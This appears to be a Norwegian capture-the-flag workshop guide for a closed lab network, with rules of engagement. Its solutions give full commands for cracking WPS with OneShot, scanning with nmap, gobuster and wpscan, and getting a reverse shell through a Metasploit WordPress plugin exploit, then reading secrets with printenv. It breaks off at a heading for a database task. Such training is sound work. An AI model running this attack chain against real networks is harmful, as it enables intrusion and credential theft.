# Hackerworkshop Bekk Fagdag 21.10.2022

I denne workshopen skal du bryte deg inn på en ruter, kartlegge nettverket, finne sårbarheter i en webserver og skaffe deg tilgang til serveren og dens database.

## Engasjementsregler

- Det er bare tillatt å angripe wifi-nettverket kalt HackMe og enheter tilknyttet ruterens lokale nettverk på `192.168.38.0/24`.

- Tjenestenektangrep mot ruteren eller andre enheter på nettverket er ikke tillatt da det vil ødelegge for andre.

- Siden alle er koblet på samme nettverk er det lurt å unngå permanente endringer av filer, rettigheter og lignende dersom du skaffer deg tilgang til en server.

## Oppgaver

### 1. Bryt deg inn på wifi-nettverket
Routeren vi har satt opp bruker en sårbar implementasjon av WPS-protokollen. Ved hjelp av [OneShot](https://github.com/drygdryg/OneShot) kan vi utnytte det! 

**Bruk Oneshot og pixiedust til å finne passordet til HackMe-nettverket. Repoet er allerede klonet og klart på maskinen!**

<details>
<summary>Hint 1</summary>
Naviger til OneShot-repoet i en terminal og kjør oneshot.py med riktig options.
</details>

<details>
<summary>Hint 2</summary>

Dere må spesifisere riktig trådløst grensesnitt ved å bruke `-i` flagget. Trådløst grensesnitt kan du finne med kommandoen `iwconfig`.
  
</details>

<details>
<summary>Hint 3</summary>
  
Om det tar lang tid, kan det hende dere har glemt å spesifisere hvilket angrep OneShot skal kjøre, ved å kjøre `--pixie-dust`.
</details>

<details><summary>Løsningsforslag</summary>
Kjør kommandoen under, og velg nettverket HackMe.
  
```
sudo python oneshot.py -i wlan0 --pixie-dust
```

</details>

</br>

### 2. Kartlegging
Nå som dere er koblet til nettverket, skal dere finne ut hvilke enheter og hvilke åpne porter som er tilgjengelige. 
Noter eventuelle interessante funn.

<details><summary>Hint 1</summary>

Her kan dere bruke verktøyet `nmap` til å scanne nettverket. Bruk `man nmap` for å se hvilke options dere kan gi til nmap.

</details>

<details><summary>Hint 2</summary>

Enheter som ligger i IP-rangen `192.168.38.100 - 192.168.38.255` er dere selv og andre deltakere i workshopen.

</details>

<details><summary>Løsningsforslag</summary>

Kjør nmap med `-A`flagget for å vise mer informasjon om her host.
  
```sudo nmap -A 192.168.38.0-100```
  
</details>


</br>

### 3. Grav dypere!
Velg dere ut det funnet fra forrige oppgave dere tenker er mest interessant å se videre på. Dere skal nå forsøke å lære litt mer om denne enheten, i jakten på en angrepsvinkel.

**a) Finn ut hvilke teknologier som er i bruk på serveren**

<details><summary>Hint 1</summary>
Også her er nmap et fint verktøy. Hvilke porter er åpne?
</details>

<details><summary>Hint 2</summary>
nma viser at port 1337 er åpen. Hva skjer om dere åpner 192.168.38.72:1337 i nettleseren?

Om dere ønsker, kan dere også bruke wappalyzer-utvidelsen i nettleseren for å undersøke nærmere. 
</details>
 
b) **Se etter skjulte ressurser på serveren ved hjelp av verktøyet `gobuster`. Bruk gjerne en kort ordliste, f. eks. [denne](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt) for å unngå å overbelaste serveren.**

<details><summary>Hint 1</summary>
Last ned ordlisten og kjør kommandoen under. Ser dere noen interessante funn?

```gobuster dir -u http://192.168.38.72:1337 -w common.txt```
</details>

<details><summary>Løsningsforslag</summary>

Her finnes det flere måter man kan konkludere med at webserveren kjører en wordpress-instans. Man kan feks åpne http://192.168.38.72:1337 i en browser, og se at "Powered by wordpress" pryder footeren på siden. 
  
Ved hjelp av gobuster kan vi også finne frem til siden (TODO: Hvilken side var det de kunne finne her?). Om dere fant denne, fikk dere også et flagg. Yay!

</details> 
 
</br>

### 4. Kjente sårbarheter?

Nå som dere har funnet ut hvilke teknologier som brukes, er neste steg å finne ut nøyaktig hvilke versjoner som kjører, og om de har noen kjente sårbarheter. 
</br></br>
**Se om dere finner noe sårbart som kjører på serveren!**

<details><summary>Hint 1</summary>

Ettersom vi vet at dette er en wordpress-server, kan vi bruke verktøyet `wpscan`. Dette verktøyet er allerede installert på kali linux, og brukes til å scanne blant annet sårbare versjoner, plugins og themes i tillegg til feilkonfigurasjoner.

</details>

<details><summary>Løsningsforslag</summary>
Kjør kommandoen under. Fra resultatet ser vi at serveren kjører en sårbar versjon av pluginen simple-file-list. 
  
```wpscan --url http://192.168.38.72:1337 ```

</details>
</br>

### 5. Exploit time!
Nå som vi er ferdig med kartlegging av målet, er det på tide å dra frem storskytsen! Vi har funnet et mål, kartlagt teknologien og funnet en sårbarhet vi kan bruke som inngang. 
</br> </br>
**Bruk metasploit til å skaffe dere et shell på serveren.**

<details><summary>Hint 1</summary>
  
For å starte metasploit (metasploit framework console) kjører dere kommandoen `msfconsole`. Inne i metasploit-konsollen kan dere bruke kommandoen `search` for å lete etter en konkret exploit. 
</details>

<details><summary>Hint 2</summary>
  
Exploiten dere trenger heter `exploit/multi/http/wp_simple_file_list_rce`. Last den inn ved å bruke `use`-kommandoen. `options`-kommandoen er nyttig for å se hvilke variabler som må settes før exploiten kjøres. 
</details>

<details><summary>Hint 3</summary>

Dere må sette følgende variabler ved hjelp av metasploits `set`-kommando.
  
```
RHOST - Remote host, denne fant dere tidligere
RPORT - Remote port, denne fant dere tidligere
LHOST - Local host. Deres egen IP (ikke localhost)
```
</details>

<details><summary>Løsningsforslag</summary>
</br>
Kjør kommandoene under, så vil du forhåpentligvis få et shell på serveren!
  
```
> msfconsole
> use exploit/multi/http/wp_simple_file_list_rce
> set RHOST 192.168.38.72
> set RPORT 1337
> set LHOST <deres egen ip>
> exploit
```  
</details>

</br>

### 6. Se dere rundt!
Nå som vi har et shell på serveren, kan vi begynne å snoke rundt etter noe interessant (.. i dette tilfellet et flagg!). 
</br></br>
**Ta en runde på serveren, og se om dere finner noe som ligner et flagg.**

<details><summary>Hint 1</summary>
Det kan være fristende å navigere rundt i filsystemet, men det vil være en blindvei i dette tilfellet. 
</details>


<details><summary>Hint 2</summary>
Hvor pleier man å gjemme hemmeligheter?
</details>

<details><summary>Hint 3</summary>
Det kan være lurt å ta en titt på miljøvariabler.
</details>

<details><summary>Løsningsforslag</summary>

Flagget ligger i en miljøvariabel på serveren. Kjør følgende kommando: `printenv`
</details>

</br>

### 7. Kom dere inn i databasen!

